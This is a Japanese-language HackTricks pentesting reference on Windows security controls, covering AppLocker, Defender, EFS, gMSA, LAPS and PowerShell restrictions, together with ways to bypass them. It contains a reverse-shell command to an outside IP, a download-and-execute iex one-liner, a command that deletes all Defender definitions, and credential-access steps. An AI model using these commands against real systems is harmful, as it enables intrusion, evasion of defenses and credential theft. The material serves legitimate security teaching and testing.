# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

アプリケーションのホワイトリストとは、システム上に存在すること、および実行することが許可された承認済みソフトウェアアプリケーションまたは実行ファイルのリストです。その目的は、組織固有のビジネスニーズに合致しない有害な malware や未承認のソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者が**ユーザーが実行できるアプリケーションやファイルを制御**できるようにします。実行ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリインストーラーを対象に、**きめ細かな制御**を提供します。\
組織では **cmd.exe と PowerShell.exe をブロック**し、特定のディレクトリへの書き込みアクセスを制限することが一般的です。**しかし、これらはすべて bypass できます**。

### Check

ブラックリストまたはホワイトリストに登録されているファイルや拡張子を確認します。
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリパスには、AppLocker によって適用される構成とポリシーが含まれており、システム上で現在適用されているルールセットを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するために便利な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内のあらゆるものの実行を許可している場合、これを **bypass** するために使用できる **writable folders** があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に **trusted** な [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリも、AppLocker の bypass に利用できます。
- **不適切に記述された rules も bypass できる可能性があります**
- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、任意の場所に **`allowed` という名前の folder** を作成すれば許可されます。
- 組織は `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable の **blocking** に注力しがちですが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` など、その他の [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を見落とすことがあります。
- システムに追加の負荷がかかる可能性があり、何も壊れないことを確認するために必要な testing 量も多いため、**DLL enforcement が有効化されていることは非常にまれです**。そのため、**DLLs を backdoors として使用することで AppLocker の bypass に役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意の process 内で **Powershell** code を **execute** し、AppLocker を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

ローカル credentials はこの file に保存され、passwords は hash 化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-On のため、この subsystem の **memory** に **credentials**（hashed）が **保存**されます。\
**LSA** はローカルの **security policy**（password policy、users permissions など）、**authentication**、**access tokens** などを管理します。\
LSA は、提供された credentials を **SAM** file 内で **check**（ローカル login の場合）し、**domain controller** と **talk** して domain user を authenticate する役割を担います。

**credentials** は **process LSASS** 内に **保存**されます：Kerberos tickets、NT hashes および LM hashes、容易に decrypt できる passwords。

### LSA secrets

LSA は一部の credentials を disk に保存することがあります：

- Active Directory の computer account の password（到達不能な domain controller）。
- Windows services の accounts の passwords
- scheduled tasks の passwords
- その他（IIS applications の password など）

### NTDS.dit

Active Directory の database です。Domain Controllers にのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は、Windows 10、Windows 11、および Windows Server の各バージョンで利用できる Antivirus です。**`WinPEAS`** などの一般的な pentesting tools を **block** します。ただし、これらの protections を **bypass する方法**があります。

### Check

**Defender** の **status** を確認するには、PS cmdlet **`Get-MpComputerStatus`** を execute します（active かどうかを確認するには **`RealTimeProtectionEnabled`** の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

enumerate するには、次のコマンドも run できます：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 暗号化ファイル システム (EFS)

EFS は、**File Encryption Key (FEK)** と呼ばれる **symmetric key** を使用してファイルを暗号化し、ファイルを保護します。このキーはユーザーの **public key** で暗号化され、暗号化されたファイルの $EFS **alternative data stream** 内に保存されます。復号が必要な場合、ユーザーのデジタル証明書に対応する **private key** を使用して、$EFS stream から FEK を復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで復号されるシナリオ**には、以下が含まれます。

- ファイルまたはフォルダーが [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) などの EFS 以外のファイル システムに移動されると、自動的に復号されます。
- SMB/CIFS protocol 経由で network 上に送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルに **透過的にアクセス**できます。ただし、所有者の password を単純に変更してログインしても、復号はできません。

**主なポイント**:

- EFS は symmetric FEK を使用し、ユーザーの public key で暗号化します。
- 復号では、ユーザーの private key を使用して FEK にアクセスします。
- FAT32 へのコピーや network transmission など、特定の条件下では自動的に復号されます。
- 暗号化されたファイルには、所有者が追加の操作なしでアクセスできます。

### EFS 情報の確認

**user** がこの **service** を**使用したことがあるか**を、この path が存在するか確認して調べます:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\ を使用してファイルに**アクセスできるユーザー**を確認します\
フォルダー内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**暗号化**および**復号**することもできます。

### EFS ファイルの復号

#### Authority System になる

この方法では、ホスト上で **victim user** が **process** を**実行している**必要があります。その場合、`meterpreter` session からユーザーの process token (`incognito` の `impersonate_token`) を impersonate できます。または、ユーザーの process に `migrate` することもできます。

#### ユーザーの Password を知っている場合

Mimikatz はユーザーの certificate と private key を import し、それらを使用して EFS で保護されたファイルを復号できます。<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft は、IT infrastructure における service account の管理を簡素化するために **Group Managed Service Accounts (gMSA)** を開発しました。従来の service account では "**Password never expire**" 設定が有効になっていることが多いのに対し、gMSA はより安全で管理しやすい solution を提供します。

- **Automatic Password Management**: gMSA は 240 文字の複雑な password を使用し、domain または computer policy に従って自動的に変更されます。この process は Microsoft の Key Distribution Service (KDC) によって処理されるため、手動で password を更新する必要がありません。
- **Enhanced Security**: これらの account は lockout の影響を受けず、interactive login に使用できないため、security が向上します。
- **Multiple Host Support**: gMSA は複数の host 間で共有できるため、複数の server 上で実行される service に適しています。
- **Scheduled Task Capability**: managed service account とは異なり、gMSA は scheduled task の実行をサポートします。
- **Simplified SPN Management**: computer の sAMaccount の詳細または DNS name に変更があると、system が Service Principal Name (SPN) を自動的に更新するため、SPN management が簡素化されます。

gMSA の password は LDAP property _**msDS-ManagedPassword**_ に保存され、Domain Controller (DC) によって 30 日ごとに自動的に reset されます。この password は、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) と呼ばれる暗号化された data blob であり、authorized administrator と gMSA が install されている server のみが取得できます。これにより、安全な environment が確保されます。この情報にアクセスするには、LDAPS などの secured connection が必要です。または、connection を 'Sealing & Secure' で authenticate する必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** を使用して、この password を読み取ることができます。
```
/GMSAPasswordReader --AccountName jkohler
```
[**この投稿で詳細を確認**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

また、**gMSA** の **password** を **read** するために **NTLM relay attack** を実行する方法については、この [web page](https://cube0x0.github.io/Relaying-for-gMSA/) も確認してください。<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) からダウンロードできる **Local Administrator Password Solution (LAPS)** により、ローカル Administrator の password を管理できます。これらの password は **randomized** され、各コンピューターで異なり、**定期的に変更**され、Active Directory に一元的に保存されます。これらの password へのアクセスは ACL によって制限され、承認されたユーザーだけがアクセスできます。十分な権限が付与されている場合、ローカル admin password を read できます。

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell の [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShell を効果的に使用するために必要な多くの機能を **制限**します。これには、COM objects のブロック、承認済みの .NET types のみの許可、XAML-based workflows、PowerShell classes などが含まれます。

### **チェック**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows ではその Bypass は機能しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには** **次が必要な場合があります** _**参照の追加**_ -> _参照_ ->_参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更**します。

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### リバースシェル:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **Powershell** code を **execute** し、constrained mode を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[1]](#references)</sup>

## PS 実行ポリシー

デフォルトでは **restricted** に設定されています。このポリシーを bypass する主な方法は次のとおりです。<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>で確認できます

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できる API です。

SSPI は、通信を行いたい 2 台のマシンに適した protocol を見つける役割を担います。これには Kerberos が優先的に使用されます。その後、SSPI は使用する authentication protocol をネゴシエートします。これらの authentication protocol は Security Support Provider (SSP) と呼ばれ、各 Windows マシン内に DLL として存在します。通信を行うには、両方のマシンが同じ SSP をサポートしている必要があります。

### 主な SSP

- **Kerberos**: 優先されるもの
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性上の理由
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web サーバーおよび LDAP。パスワードは MD5 hash の形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL および TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用する protocol（Kerberos または NTLM。デフォルトは Kerberos）をネゴシエートするために使用される
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数の method または 1 つ בלבדを提示できます。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**権限昇格された操作に対する同意プロンプト**を有効にする機能です。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [AppLocker と PowerShell constrained language mode の Bypassing](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [EFS ファイルを decrypt する方法](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA の Relaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy を Bypass する 15 の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
